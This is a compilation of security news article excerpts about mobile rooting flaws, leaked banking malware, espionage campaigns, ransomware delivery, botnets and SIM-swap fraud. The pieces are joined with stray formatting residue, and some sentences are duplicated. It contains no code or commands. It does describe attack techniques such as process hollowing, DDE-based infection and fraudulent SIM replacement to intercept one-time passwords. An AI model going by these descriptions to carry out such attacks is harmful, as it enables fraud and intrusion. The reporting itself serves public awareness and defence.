It has been dubbed TowelRoot by Lacoon, in reference to a recently released tool designed to help users root their Android phones.  According to Ohad Bobrov, vice president of research and development with Lacoon Mobile Security, TowelRoot affects Android 4.4 mobile devices and is extremely prevalent on the Android-based devices on the market, including in the Samsung Galaxy S5. \"This security vulnerability, when exploited, can allow any app to escalate it’s privileges to root (administrator) privileges,\" blogged Bobrov. \"This would allow an attacker to bypass the Android security model and run malicious code under administrator privileges; retrieve various files and sensitive information from the device; bypass enterprise data protection applications including secure containers, wrappers and hardened apps; [and] insert a persistent backdoor on the device to be later used for further attack activities.\" The TowelRoot tool was released a few days ago on the Internet. It uses the vulnerability to root many of the mobile devices in the market, such as the LG G Flex and the Samsung Galaxy Note 3. The app was developed by white hat hacker George Hotz, aka 'Geohot', who is also known for having hacked Apple iOS devices.  \"This tool is being widely publicized and is easily available for use without the need for technical know-how,\" Bobrov blogged. \"Right now this vulnerability is only used by the rooting tool and has yet to show up in any malicious sample. Learning from the past, we can assume that it is only a matter of time until exploits for this vulnerability are distributed through other channels.\" To mitigate the threat, he suggested organizations take a number of steps, such as only installing applications from reputable sources to limit the likelihood of downloading a malicious application that takes advantage of the vulnerability. In addition, he suggested users do not open suspicious or unknown links sent to to the device, and do not root it. " }

The malware family whose source code has been published is known as GM Bot, MazarBot, SlemBunk, Bankosy, Acecard and Slempo. The threat is capable of displaying phishing pages on top of mobile banking applications in an effort to trick users into handing over their credentials. GM Bot is also designed to intercept SMS messages and forward phone calls, which helps cybercriminals bypass additional bank security mechanisms. The SMS interception and call forwarding features can be used in combination with an option that allows fraudsters to lock a device’s screen in an effort to give them additional time to work. Attackers can also use the threat to spy on victims (i.e. obtain their location via GPS), steal information entered on various websites, and delete data from the infected device. According to IBM researchers, someone leaked the GM Bot source code in an effort to boost their reputation on an underground forum. The leaker posted a tutorial on the use of mobile malware for banking fraud, along with a password-protected archive containing the code for the GM Bot and its control panel. “[The fraudster] indicated he would give the password to the archive only to active forum members who approached him. Those who received the password in turn passed it on to other, unintended users, so the actual distribution of the code went well beyond that discussion board’s member list,” IBM cybersecurity evangelist Limor Kessem wrote in a blog post. Experts determined that the GM Bot control panel allows malware operators to manage stolen data, configure the Trojan, and create new phishing pages that are displayed on top of legitimate bank applications. Attackers can use the control panel to access stolen information associated with credit cards, bank accounts, applications found on infected devices, online forms filled out by victims, and accounts for various online services. The stolen details can be sorted based on the country of origin. It’s not uncommon for malware source code to get leaked, in many cases as a result of a dispute between cybercriminals, like in the case of the RIG exploit kit. Now that the GM Bot code has become available, experts believe we’ll likely see new Android threats based on it. “The exposure of GM Bot’s code is comparable to the source code leaks of PC Trojans that include Zeus, SpyEye, Carberp and others. While GM Bot may not be as prolific as the major banking Trojans mentioned here, it is definitely a game changer in the realm of mobile threats. Its source code leak, similar to the Zeus leak, is likely to give rise to many variations of this sort of malware,” Kessem said. " }

Kaspersky identifies the cyber-espionage campaign as \"Icefog”, with researchers describing the tactics used as “hit and run” attacks against very specific targets with “surgical precision”.   “We believe this is a relatively small group of attackers that are going after the supply chain -- targeting government institutions, military contractors, maritime and ship-building groups, telecom operators, satellite operators, industrial and high technology companies and mass media, mainly in South Korea and Japan,” Kaspersky Lab experts wrote in a post to the company’s Securelist blog late Wednesday.  According to Kaspersky, the attackers targeted, but did not necessarily compromise, defense industry contractors such as Lig Nex1 and Selectron Industrial Company, shipbuilding companies such as DSME Tech, Hanjin Heavy Industries, telecom operators such as Korea Telecom, media companies such as Fuji TV and the Japan-China Economic Association.  The operation commenced in 2011, the report said, and has increased in size and scope over the last few years, and includes successful attacks against the Japanese House of Representatives and the House of Councillors in 2011. In total, Kaspersky Lab said that it has observed more than 4,000 unique infected IPs and several hundred victims.  “At its core, Icefog is a backdoor that serves as an interactive espionage tool that is directly controlled by the attackers,” the Russian security firm explained. “It does not automatically exfiltrate data but is instead manually operated by the attackers to perform actions directly on the infected live systems. During Icefog attacks, several other malicious tools and backdoors are uploaded to the victims' machines for lateral movement and data exfiltration.”  The attackers apparently know what they are after and target sensitive documents and company plans, email account credentials, and passwords to access various resources inside and outside the victim’s network, Kaspersky said.  Interestingly, after the attackers get what they want, they leave and don’t hang around looking for more.  “While in most other APT campaigns, victims remain infected for months or even years and attackers continuously steal data, Icefog operators process victims one by one, locating and copying only specific, targeted information. Once the desired information has been obtained, they leave,” Kaspersky noted.  “For the past few years, we’ve seen a number of APTs hitting pretty much all types of victims and sectors. In most cases, attackers maintain a foothold in corporate and governmental networks for years, smuggling out terabytes of sensitive information,” said Costin Raiu, Director, Global Research & Analysis Team. “The ‘hit and run’ nature of the Icefog attacks demonstrate a new emerging trend: smaller hit-and-run gangs that go after information with surgical precision. The attack usually lasts for a few days or weeks and after obtaining what they were looking for, the attackers clean up and leave. In the future, we predict the number of small, focused ‘APT-to-hire’ groups to grow, specializing in hit-and-run operations; a kind of ‘cyber mercenary’ team for the modern world.”  Versions of Icefog have been identified for both Microsoft Windows and Mac OS X systems. However, while Kaspersky Lab was able find more than 350 Mac OS X infections, they haven’t identified victims of targeted attacks that were infected with Icefog, but they do believe they exist.  Most Mac OS X victims (95%) are in China, according to the report, as the Mac version was being spread through Chinese bulletin boards which could have been a beta-testing phase for Mac OS X versions to be used in targeted attacks down the road.  Through extensive analysis of code and the IP addresses used to monitor and control the infrastructure, Kaspersky researchers have made the assumption that some of the players behind the threat operation are based in at least three countries: China, South Korea and Japan,\" with the largest number stemming from China.   Kaspersky said additional information on attribution is available in a private report available to governments.  Kaspersky’s team has managed to sinkhole 13 of the 70+ domains used by the attackers so far, which helped them generate statistics on the number of victims. Additionally, the Icefog command and control servers kept encrypted logs of their victims along with the various operations performed on them, which can assist in identifying the targets of the attacks and possibly the victims.   According to the report, in addition to Japan and South Korea, many sinkhole connections in other other countries were seen, including connections in Taiwan, Hong Kong, China, the USA, Australia, Canada, the UK, Italy, Germany, Austria, Singapore, Belarus and Malaysia. While the focus of the Icefog attacks has been mainly in South Korea and Japan, Kaspersky researchers say it is likely that the crew targets organizations in the Western world as well, including the U.S. and Europe.  Depending on the level of malicious intent by the attackers and their success in penetrating companies connected to the technology supply chain, the fallout of these attacks or similar attacks could be serious.  Less than a year ago, Gartner analysts warned that IT supply chain integrity issues are real, and would have mainstream enterprise IT impact within the next five years.  Gartner is not the only group voicing concern over risks in the IT supply chain. A March 2012 report from Northrop Grumman prepared for the U.S.-China Economic and Security Review Commission warned that “Successful penetration of a supply chain such as that for telecommunications industry has the potential to cause the catastrophic failure of systems and networks supporting critical infrastructure for national security or public safety.” In March 2012, “The Open Group,” a consortium of supply chain experts, shared details on standards designed to improve the security of the global supply chain for commercial software and hardware products. \"The modern supply chain depends upon a complex and interrelated network involving the movement of goods, services, funds, and information across a wide range of global participants, making it vulnerable to increasingly sophisticated cyberattacks and an ever increasing range of breaches and disruptions,\" Andras Szakal, vice president and chief technology officer, IBM U.S. Federal, said previously. The U.S. Department of Defense has also showed awareness of these supply-chain risks, and initiated a Supply Chain Risk Management (SCRM) policy and strategy to address the vulnerabilities.  According to a U.S. Department of Defense report (DTM 09-016) from March 2010, “A pilot program is under way, with the objective of live application by FY 2016, to implement “a SCRM capability that integrates program protection planning, enterprise architecture, counterintelligence, information assurance, systems engineering, procurement, enhanced test and evaluation, and other measures to mitigate supply chain risk.” Kaspersky used the name \"Icefog\" because of a string used in the command-and-control server (C&C) name of one of the malware samples they analyzed. In the video below, Vitaly Kamluk, a principal security researcher on Kaspersky Lab's Global Research and Analysis team, describes Icefog in more detail.  Kaspersky Lab has published a full report (PDF) with a detailed description of the backdoors and other malicious tools used in Icefog, along with indicators of compromise (IOC). An FAQ is also available.  " }

One of the methods involves the use of the Dynamic Data Exchange (DDE) protocol, which has been designed to allow Windows applications to transfer data between them. Consisting of a set of messages and guidelines, it uses shared memory to exchange data between applications. Malicious actors found a way to use DDE with Office documents and automatically run malware without the use of macros. DDE, which allows an Office application to load data from another Office application, was replaced by Microsoft with Object Linking and Embedding (OLE), but continues to be supported. The technique was previously observed being employed by the FIN7 hacking group in recent DNSMessenger malware attacks, and Internet Storm Center (ISC) handler Brad Duncan says it could also be associated with a Hancitor malware campaign spotted earlier this week. Now, Duncan reveals that Locky too has adopted the use of Office documents and DDE for infection. Delivered through spam emails originating from Necurs, the documents were attached to messages posing as invoices. The analyzed attack used a first-stage malware that achieved persistence on the compromised system. The Locky binary, on the other hand, was deleted post-infection. The use of DDE for infection, however, is only one of the methods Locky employs. As Trend Micro points out, Necurs also distributed the ransomware through HTML attachments posing as invoices, Word documents embedded with malicious macro code or Visual Basic scripts (VBS), malicious URLs in spam emails, and VBS, JS, and JSE files archived via RAR, ZIP or 7ZIP. “The continuous changes in Locky’s use of file attachments are its way of adjusting its tools to evade or bypass traditional security. But despite the seeming variety, there are common denominators in Locky’s social engineering, particularly in the email subjects and content. They appear to have the same old flavors, but with relatively different twists,” the security researchers explain. Recent Necurs-fueled distribution campaigns were also observed dropping the TrickBot banking Trojan via the same attachments carrying Locky. " }

The operation is believed to have netted a hacker more than $600,000 in the past two months. The situation came to light in February when users began reporting their Synology Network Attached Storage devices were performing poorly and had a high CPU usage. Eventually, an investigation revealed the situation was being caused by malware that had infected the systems. In a comedic twist, the malware was stored in a folder named 'PWNED.' \"To date, this incident is the single most profitable, illegitimate mining operation,\" blogged Dell SecureWorks' Counter Threat Unit researchers David Shear and Pat Litke. \"This conclusion is based in part on prior investigations and research done by the Counter Threat Unit, as well as further searching of the Internet. As cryptocurrencies continue to gain momentum, their popularity as a target for various malware will continue to rise.\" According to the researchers, a hacker took advantage of vulnerabilities in the DiskStation Manager (DSM), a custom Linux-based operating system for Synology NAS systems. The vulnerabilities allowed the attacker to breach the system and get administrative privileges. \"Andrea Fabrizi disclosed these in September of 2013,\" according to Dell SecureWorks. \"In his disclosure, Fabrizi detailed which versions of the DSM were affected. According to Synology, patches for the vulnerabilities were released shortly after their disclosure. They also released a patch in February 2014 to help affected users resolve any issues stemming from the vulnerabilities. Further information on the release can be found on their website.\" In their investigation, the researchers were able to track down a few leads on the source of the attacks. \"Tracking a threat actor is frequently a wild goose chase that leads down many rabbit holes,\" according to Dell SecureWorks. \"In this case, we started our investigation by looking at the username found in the configuration file \"foilo.root3\". Scouring Google brought back several interesting results, namely the threat actor's Github and BitBucket account. In browsing through some of the hacker's publicly available code, it becomes quite clear that \"Foilo\" is not new to the world of exploitation and malware.\" \"By correlating some of the strings found in other configurations posted around the net (as this breach was coming to light), coupled with his BitBucket page, the findings strongly indicate that the threat actor is of German descent,\" the researchers noted. \"Regardless of whom he actually is, the fact that he has been able to amass well over $600,000 USD speaks entirely for itself.\" " }

According to McAfee, the samples belonged to the Vertexnet botnet. The malware uses multiple layers of obfuscation – but once decoded, connects to a control server to accept commands and transfer stolen data. In McAfee's analysis, the sample is packed using a custom packer. Once executed, it drops three files in the %TEMP% folder. \"These files are compiled using aut2exe,\" McAfee researcher Hardik Shah blogged. \"The malware next executes the file botnet.exe from the temp folder. This file is written in AutoIt.\" The file uses numerous encrypted, obfuscated variables. Decoding them revealed that the script calls various Windows APIs using the AutoIt DLL functions DllStructCreate, DllStructGetPtr, DllCall and others. \"The technique of running an executable from memory through an AutoIt script is well documented…To summarize, it first creates a process with with the CREATE_SUSPENDED flag,\" Shah wrote. \"Next it uses GetThreadContext to get the CONTEXT structure. Subsequently, it uses WriteProcessMemory,SetThreadContext and allocates memory for the data.\" \"Then it resumes the thread,\" Shah continued. \"After dumping the data in WriteProcessMemory calls, we get a Visual Basic file, which uses the RunPE method to execute the payload. After dumping the data in WriteProcessMemory calls, we get a Visual Basic file, which uses the RunPE method to execute the payload.\" In May, Trend Micro researchers noted both an increase in the amount of malware using AutoIt as a scripting language as well as the presence of AutoIt hacker tools online.  \"The increased usage of AutoIt is likely attributed to the fact that AutoIt is scalable, very similar to Basic, and is outrageously easy to code in,\" Trend Micro Senior Threat Researcher Kyle Wilhoit blogged at the time. \"This ease of use takes the learning curve off learning more complex languages such as Python. This opens up a wide array of possibilities to hackers that may not otherwise expose themselves to a scripting language. In addition, the ability to host code on Pastebin, natively compile, and run applications in stand-alone executable files makes it very quick to develop in. Finally, the ability to natively support UPX packing in AutoIt makes obfuscation easy for AutoIt applications.\" McAfee's write-up can be found here.  " }

Some of the technical aspects of the botnet, the security researchers say, reveal a possible connection to Mirai, which stormed the world a year ago. However, this is an entirely new threat and the campaign that is rapidly spreading worldwide is much more sophisticated. The new threat first emerged at the end of September, but Check Point says that over one million organizations globally might have been already hit. What is yet unclear is the purpose of this massive network of ensnared devices. To compromise devices, the malware attempts to exploit a large number of vulnerabilities commonly found in various IP camera models. Targeted vendors include GoAhead, D-Link, TP-Link, AVTECH, NETGEAR, MikroTik, Linksys, Synology and others. Because the attempted attacks were coming from different sources and a variety of IoT devices, the researchers concluded that the compromised devices themselves were spreading the malware. “So far we estimate over a million organizations have already been affected worldwide, including the US, Australia and everywhere in between, and the number is only increasing,” Check Point says. The analysis of an infected device revealed that the attackers accessed the System.ini file to check for compromise. Normally, that file would contain the credentials of the user, but on the hacked device it contained a ‘Netcat’ command to open a reverse shell to the attacker’s IP instead. Thus, the researchers concluded that the machine, a GoAhead device that was compromised using the CVE-2017-8225 vulnerability, was transmitting the infection after being infected itself. “Upon further research, it was found that numerous devices were both being targeted and later sending out the infection. These attacks were coming from many different types of devices and many different countries, totaling approximately 60% of the corporate networks which are part of the ThreatCloud global network,” Check Point notes. The security researchers provided a list of device types – per vendor – that are supposedly targeted by the botnet. They also suggest that the actor behind this threat might be getting ready for massive, global attacks, possibly distributed denial of service (DDoS). With over 20 billion devices expected to be connected to the Internet by 2020, the threat of insecure IoT devices is growing bigger every day. Europol too warns of the security challenges this continuously expanding market faces. “The Internet of Things is a wide and diverse ecosystem where interconnected devices and services collect, exchange and process data in order to adapt dynamically to a context. In simpler words, it makes our cameras, televisions, washing machines and heating systems ‘smart’ and creates new opportunities for the way we work, interact and communicate, and how devices react and adapt to us,” Europol says. The agency also underlines the importance of properly securing these devices and of implementing adequate protections to keep IoT devices safe from cyber threats. Europol notes that the fast adoption of IoT also raised new legal, policy, and regulatory challenges that require cooperation across different sectors to tackle. “Internet of Things is not only here to stay but expected to significantly expand as more and more households, cities and industries become connected. Insecure IoT devices are increasingly becoming tools for conducting cyber criminality. We need to act now and work together to solve the security challenges that come with the IoT and to ensure the full potential,” Rob Wainwright, Executive Director of Europol, commented. " }

The malware was first spotted in 2011, and functions similar to other financial malware like Carberp. Currently, attackers are focusing their efforts on customers of major banks in Europe, and previous analysis has show n the malware is most active in the U.K., Italy, Turkey and Denmark. \"Caphaw avoids local detection by injecting itself into legitimate processes such as explorer.exe or iexplore.exe, while simultaneously obfuscating its phone home traffic through the use of Domain Generated Algorithm created addresses using Self Signed SSL certificates,\" blogged Sachin Deodhar and Chris Mannon at Zscaler's ThreatLabZ. \"This limits the ability of traditional network monitoring solution to dissect the packets on the wire for any malicious transactions.\" \"The geoip (location) information derived from the infected host is of special significance to this malware,\" the researchers continued. \"The malware leverages the following legitimate URL: hxxp://j.maxmind.com/app/geoip.js to discover geoip information about its freshly infected victim.  Administrators should view this transaction as a starting point for their investigation into any suspicious activity. It is not a malicious service, but illustrates how malware writers can leverage even legitimate services. The infection uses the output of this script to extract location information about the infected host/victim.\" So far, the initial infection vector has not been determined, though Zscaler suspects it is being delivered via an exploit kit exploiting vulnerabilities in Java due to the fact that the user agent for every single transaction that has come through Zscaler's Behavioral Analysis solution has been: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_07. Across all 64 distinct samples Zscaler has collected, there have been 469 distinct IPs where there has been a call to a DGA (domain generation algorithm) location. DGA is used by multiple malware authors in the name of obfuscation, including the PushDo botnet and the TDL/TDSS malware. \"A domain generation algorithm (or DGA) represents an algorithm seen in various families of malware to generate a large number of quasi-random domain names,\" the researchers noted. \"These can be used to identify the malware's command and control (CnC) servers so that the infected hosts can \"dial home\" and receive/send commands/data. The large number of potential rendezvous points with randomized names makes it extremely difficult for investigators and law enforcement agencies to identify and \"take down\" the CnC infrastructure. Furthermore, by using encryption, it adds another layer of difficulty to the process of identifying and targeting the command and control assets.\" Some of the banks being targeted by the malware include SunTrust, Wells Fargo and Sovereign Bank. A list of the remaining banks can be found on the Zscaler blog. " }

In new research, security firm Trusteer revealed two examples of just how much. According to Trusteer, the first scheme starts with a drive-by download infecting victims with the Gozi Trojan. Once the Trojan is on the victim’s PC, it uses a Web page injection that prompts the victim to enter the International Mobile Equipment Identity (IMEI) number on their mobile device before they can enter their online bank account. For those who don’t know what an IMEI number is, the scammers are thoughtful enough to explain how to find it on the phone’s battery or dialing *#06# on the device keypad. But the attack does not stop there. Once the attackers have the IMEI number, they contact the victim’s wireless service provider and report the mobile device lost or stolen. Then they ask for a new SIM (subscriber identity module) card. “In countries where carriers require you to provide a police report, the fraudsters do that too,” said Oren Kedem, director of product marketing at Trusteer. “As you can also see from the previous blog post we referenced from several weeks ago, the fraudsters are also using other tactics to redirect SMS and phone calls.” With the new SIM card, all one-time passwords (OTPs) sent to the victim’s phone to verify their identity are sent to the attacker. The second attack brings together the worlds of cyber and physical fraud, starting with a man-in-the-browser or phishing attack aimed at stealing the victim’s bank account credentials, phone number and other relevant information. From there, the scammers impersonate the victim and go to the local police department to report the victim’s mobile phone has been lost or stolen. This allows the scammer to get their hands on a police report for the device, Trusteer explained. With the police report in tow, the criminals show up to one of the wireless service provider’s retail outlets and tricks the provider into deactivating what is thought to be a stolen SIM card and providing a new one. Meanwhile, the scammer calls the victim to notify them that their mobile phone service will be interrupted for the next 12 hours he criminal then calls the victim to notify them that their mobile phone service will be interrupted for the next 12 hours to buy time. Once again, the new SIM card is used by the attacker to get their hands on the one-time passwords used by banks for authentication, allowing them to authorize their fraudulent transactions. Since accounts protected by OTP systems typically have higher transfer limits and are less scrutinized, they are more lucrative, according to Trusteer – which explains why criminals are willing to go to great lengths to gain access to them. According to Kedem, the second scheme has been used by criminals in Eastern Europe and Russia. “Most online banking fraud involving malware is perpetrated by some form of organized crime,” he said. “We have seen this in action and this was reported in a forum. Given the complexity involved with this fraud, we assume this is only done for high return on investment attacks.” Kedem advised online bankers to validate any request for new data with the bank, and to be suspicious of any unsolicited calls from the bank or carrier asking for information.

The Python-based tool released as open source by the spy agency is named Assemblyline and it was created within the CSE’s Cyber Defence program. The organization says this is one of the tools it uses to protect the country’s computer systems against advanced cyber threats. Assemblyline allows defenders to automate the analysis of malicious files. The analysis process, which has been compared to a conveyor belt, involves assigning a unique identifier to files as they travel through the system, looking for signs of malicious functionality and extracting features for further analysis, generating alerts for malicious files and assigning them a score, and sending data to other protection systems so that identified threats can be neutralized. Users can also add their own analytics, including custom-built software and antiviruses, to enhance Assemblyline’s capabilities. “The strength of Assemblyline is the ability of users to scale the system to their needs and the way that Assemblyline automatically rebalances its workload depending on the volume of files. It reduces the number of non-malicious files that security analysts have to inspect, and permits users to focus their time and attention on the most harmful files, allowing them to spend time researching new cyber defence techniques,” CSE said. The Assemblyline source code is available on BitBucket. Organizations can modify it to suit their needs or integrate it into existing solutions. The CSE is a security and intelligence organization focused on collecting intel in support of the government’s priorities, and protecting the country’s most critical computer networks. While the spy agency has often been described as “super secret,” some insight into its activities was revealed by documents leaked a few years ago by former NSA contractor and whistleblower Edward Snowden. The documents showed that the CSE had been analyzing a foreign espionage operation that it had linked to French intelligence. The campaign has since been investigated by many researchers and cybersecurity firms. The CSE is not the only spy agency to release open source tools.

Researchers at Symantec say the group, which numbers between 50 and 100, has been active since 2009 and has been involved not only in the infamous Operation Aurora, but also an attack on Bit9 in 2012 and an expansive campaign of watering hole attacks that affected thousands of machines earlier this year. Known as the VOHO campaign, it combined both regional and industry-specific attacks and focused on organizations primarily operating in the United States.  \"In a rapidly spreading two-phase attack, which started on June 25 and finished July 18, nearly 4,000 machines had downloaded a malicious payload,\" according to a whitepaper Symantec released on the group. \"These payloads were being delivered to unsuspecting victims from legitimate websites that were strategically compromised.\" Many of the victims being targeted were U.S. defense contractors protected by Bit9's whitelisting software. To get around this obstacle, the attackers turned their attention to Bit9, ultimately breaching their file signing infrastructure and obtaining the ability to sign malware files in their bid to infect users. \"The attackers installed Backdoor.Hikit, a Trojan that provides extremely stealthy remote access to compromised systems,\" according to the whitepaper. \"This highly customized Trojan is typically installed onto servers in the victims’ DMZ, which was the case at Bit9. Credentials for another virtual machine were then stolen. These were used to access the virtual machine that contained one of Bit9’s digital code-signing certificates. The attackers used this code-signing infrastructure to sign thirty-two malicious files, some of which were then retrieved to be used in subsequent attacks on select organizations in the United States defense industrial base.\" Much of the tools and infrastructure linked to the attacks originate from network infrastructure based in China, Symantec reported. The frontline of the crew consists of a team that uses disposable tools along with basic techniques to attack different targets. This unit – dubbed Team Moudoor after the Trojan they use – also acts as intelligence collectors as well. A second team acts as an elite group used to crack the most valuable targets, and referred to as Team Naid by Symantec after the Trojan they use. While researchers did not uncover any information about how much the group is being paid for its services, Symantec security researcher Vikram Thakur speculates it must be significant given the group's uncommon size.   \"Hidden Lynx is unique because it is one of the most organized, sophisticated groups using cutting edge hacking techniques to access information from organizations in some of the most technically advanced countries in the world,\" said Thakur. Since 2011, six campaigns have been connected to the group. Roughly 53 percent of their victims were in the United States. The next biggest group - 15.53 percent - were located in Taiwan. Approximately 24 percent were in the finance industry, while 17 percent were in education. Just more than 15 percent were in the government sector. \"The group’s goal is to gain access to information within organizations in some of the wealthiest and most technologically advanced countries across the globe,\" according to Symantec's research paper. \"It is unlikely that they can use this information for direct financial gain, and the diversity of the information and number of distinguishable campaigns would suggest that they are contracted by multiple clients. This leads us to believe that this is a professional organization that offers a “hackers for hire” service.\" " }

These methods, commonly known as evasion techniques, include the use of domain generation algorithms, or DGAs, which allow the malware to avoid blacklists, signature filters, and reputation-based detection systems. Most of the security world knows the concept of DGAs as fluxing, or the ability to use multiple FQDNs and tie them to a single IP or C&C. According to Damballa, there are six families using these methods, including the newest Zeus variant, Bamital, BankPatch, Bonnana, Expiro.Z, and Shiz. The oldest, BankPatch, has been using DGAs for more than two years. \"While DGAs are not new, the rate at which they are being adopted and their ability to elude the scrutiny of some of the most advanced malware analysis professionals should be of great concern to incident response professionals,\" stated Gunter Ollmann, vice president of research for Damballa. The concept of DGAs is simple enough, but incredibly stealthy, Damballa said. Malware that has infected an endpoint device is programmed with an algorithm that uses a 'seed' value, like the current date, to generate potentially hundreds of seemingly random domain names that all attempt to resolve to an IP address. Nearly all of the domain names will result in a 'non-existent' domain message (NXDomain). Only one or a few will actually resolve to an IP address. The criminal operator, knowing the nature of the algorithm and the seed that will be used that day, will register only one (or a few) of the domains and have them resolve to his C&C infrastructure. The next day the cycle repeats. The domains used for the previous day's connection are discarded, meaning the domain names are 'thrown away,' and even if detected, would be meaningless in stopping the threat or discovering the criminal C&C. “We have found that the security community as a whole has insufficiently or only partially analyzed the network behaviors of DGA-capable malware. For one, some advanced malware is using DGA as a secondary connection technique when the primary technique, let's say peer-to-peer, has failed. Those charged with protecting the enterprise that have detected or blocked the obvious primary connection technique have failed to counter the back-up technique, and the malware can then successfully locate the C&C using DGAs,” Ollmann added. A report on the use of DGAs can be read here.  In related news, Damballa released the Failsafe MicroSensor this week, an alternative to the company's existing 1U Sensor. Damballa Failsafe hunts for hidden infections by correlating a variety of observed network behaviors that indicate when malware-infected devices (PCs, Macs, servers, smartphones, iPads, etc.) are communicating with criminals. Additionally, Damballa has integrated Failsafe with HP ArcSight Logger for capturing real-time streams of DNS logs. " }

In a spate of campaigns targeting victims in both the financial sector, government and elsewhere, multiple groups have been at work trying to lure victims into downloading malicious files disguised as documents about the conference, which started today in St. Petersburg, Russia. In one email with the subject line: 'Revised Building Blocks (Round 2)', victims receive an RAR archive file with five files in it. Of the five files, two of them masquerade as different file types, explained Symantec security researcher Satnam Narang. \"One of the documents is actually an executable, while the .msg file is a .lnk file, which we have seen used in attacks before,\" the researcher blogged. \"If the victim tries to run the .msg file, it will run both the malicious executable and one of the non-malicious documents.\" The malicious executable that runs in the background is the notorious Poison Ivy remote access tool. A similar attack was reported Wednesday by Trend Micro, which warned about an email with the subject 'Pre-Summit Meeting of G20.' Like the attack detected by Symantec, the email comes with a RAR attachment; this time however, it only contains three files – one LNK file and two other binary files. \"The LNK file is not a simple shortcut file; it contains custom commands that recontrust the two separated binary files into one file and execute it (detected as BKDR_SISPROC.A),\" explained Lenart Bermejo, senior threats response engineer at Trend Micro, in a blog post. \"As a backdoor, BKDR_SISPROC.A communicates to its remote servers to execute malicious commands onto the infected system. More importantly, this backdoor also downloads plugins, which will then execute varous data-stealing behaviors such as screen capture and keylogging.\" \"Overall, the techniques exhibited by this attack do not constitute a new threat,\" the researcher continued. \"However, as we have predicted and confirmed this year, malicious actors are focused on refining how they distribute threats and evade detections. The splitting of a binary file into two files is a clear sign of the ongoing attempts to keep attacks under the radar.\" " }

Malicious Sites Nearly Double, while Mobile Malware Continues to Grow. McAfee today released its Threat Report for the Fourth Quarter of 2011 which indicated that while malware continues to be created at a wild pace, overall growth of PC-based malware actually declined during the quarter. McAfee also said that it has reached a new milestone in terms of total malware captured to-date which has now surpassed 75 million samples. While the creation of new PC-based malware slowed in Q4, McAfee saw that mobile malware continued to increase, marking 2011 as its busiest year to date, with a spike in the second half of the year. These findings echo a recent report from Juniper Networks that showed a whopping 3,325 percent increase in malware specifically targeting the Android platform in the last seven months of 2011 alone. “Given that more of the world’s users will conduct personal and business transactions through mobile devices, the industry faces a tremendous challenge, requiring more cooperation and coordination to keep them safe,” warned Vincent Weafer, senior vice president of McAfee Labs. McAfee reported a continued decline in Fake AV malware, which dropped considerably from Q3, while AutoRun and password-stealing Trojan malware showed modest declines. Other than a spike in malware targeting Mac OS that was witnessed in Q2 2011, Mac OS malware remained at very low levels the last two quarters of the year. “As always, comparing overall malware growth for the Mac with that for PCs makes the Mac threat look rather tame, but it’s always wise to protect your system,” the report notes. Contributing to the rise in malware were rootkits, or stealth malware, McAfee says. While rootkits are considered the most sophisticated and dangerous form of malware, often capable of going unnoticed on a system for a prolonged period, there appeared to be a slight decline in Q4. Web Threats  In Q4 2011 McAfee Labs found an average of 9,300 new malicious sites per day, up from 6,500 per day in Q3. McAfee currently counts more than 700,000 active malicious URLs in its database, noting that North America housed the largest number of servers hosting the malicious content, at over 73 percent. Spam Spam reached its lowest level in years toward the end of 2011, especially in areas such as the United Kingdom, Brazil, Argentina and South Korea. Despite the drop, McAfee noticed a continued trend highly sophisticated and targeted in spearphishing attacks. \"As always, social engineering lures and spam subject lines vary greatly depending on the part of the world in which we find them,\" the report notes. \"Messaging subjects still show great global diversity and specificity.\" Botnets In the word of botnets, McAfee said that overall botnet growth rebounded in November and December after falling since August, with Brazil, Columbia, India, Spain and the United States all seeing significant increases. Germany, Indonesia and Russia declined. Of the botnets, Cutwail continues to reign supreme, while Lethic has been on a steady decline since last quarter. Grum made a significant comeback after a long decline, surpassing Bobax and Lethic by the end of Q4. Network Threats McAfee said that the top network threat during the quarter came via vulnerabilities in Microsoft Windows remote procedure calls. This was followed closely by SQL injection and cross-site scripting attacks. “The threat landscape evolved greatly in 2011, and we saw a significant shift in motivation for cyberattacks,” Weafer concluded. “Security issues made more headlines in 2011 than ever before, and showed that no organization, platform or device is immune to increasingly sophisticated threats.” The full McAfee Threats Report: Fourth Quarter 2011is available for download here.

In addition to the four critical updates are 10 other bulletins 'Important' that cover issues in Windows, Microsoft Office and the .NET Framework. \"First reaction to this month’s patch notification is the sheer number of bulletins,\" said Ken Pickering, director of engineering, CORE Security. \"While most of them are fairly standard, there is a long list of them with which administrators must content.\" Opinions were mixed about how the bulletins organizations should be prioritized, but multiple experts said bulletin 1 is likely the one that should be taken care of first. \"Bulletin #1 is for Sharepoint Server and should be the highest priority on the list for your server administrators, after diligent testing to assure that the patch does not impact any business critical functionality,\" noted Qualys CTO Wolfgang Kandek. The data on a server machine is typically more valuable than data on a workstation machine, and it is fairly easy to discover Sharepoint servers using Google, said Tommy Chin, technical support engineer at CORE Security.  \"Attackers can leverage this easy-to-obtain list, and start hammering on Sharepoint servers around the world. Just because the patch potentially doesn’t require a restart doesn’t mean that this vulnerability should not be treated with highest severity,\" Chin said. Bulletin two should also be a high priority for enterprise desktop security teams because it addresses a flaw in Microsoft Office that can be triggered by simply previewing an e-mail in Outlook, even without explicitly opening the e-mail, blogged Kandek. In addition to the Microsoft updates, Adobe Systems has plans for some updates of its own for Adobe Reader and Acrobat. The vulnerabilities, which have a priority rating of '2', are considered critical and affect both Microsoft Windows and Mac OS X computers. The updates for both Microsoft and Adobe will be released Sept. 10.  " }

The tool scans systems to find settings that may have been modified by spyware, malware or other programs that have wiggled their way onto a system and caused problems. HijackThis generates reports to help users analyze and fix an infected or problemed computer. But the tool is not designed for novices – and doesn’t actually determine what’s good or bad. That’s up to you, but it is a good way to keep an eye on things and possibly locate anomalies that may have been missed by other security products. Trend Micro warns that if you don’t know what you’re doing, it’s probably not a good idea to make any changes to your computer settings and system files. Cupertino, California based Trend Micro acquired the tool from creator Merijn Bellekom in 2007, and has offered it for free ever since, but now is making the code available to the public. The code, originally written in Visual Basic, is now officially available at Sourceforge here. Commenting on the move to open source, Bellekom says users will now be able to improve their anti-malware tools. \"This means that other people can build on a solid base to create or improve their own anti-malware tools,” he said. The tool has been popular in several online security forums, and its common for users of HijackThis to post a log file in order to get feedback from others on what steps to take in the event someone has an infected system. “The OSS framework provides people with an opportunity to help others in a rich and diverse environment, and this ensures that HijackThis will continue building on its strength in serving the community,\" said Paul Laudanski founder of Castlecops.com, a security oriented community that has since shut down. HijackThis been downloaded well over 10 million times, but Trend Micro hopes the move to open source will bring a new level of interest and further push the tool to the next level. Trend Micro says it will continue to maintain the original source code and will update the base code on SourceForge as developers make modifications that are essential and positive to the continued 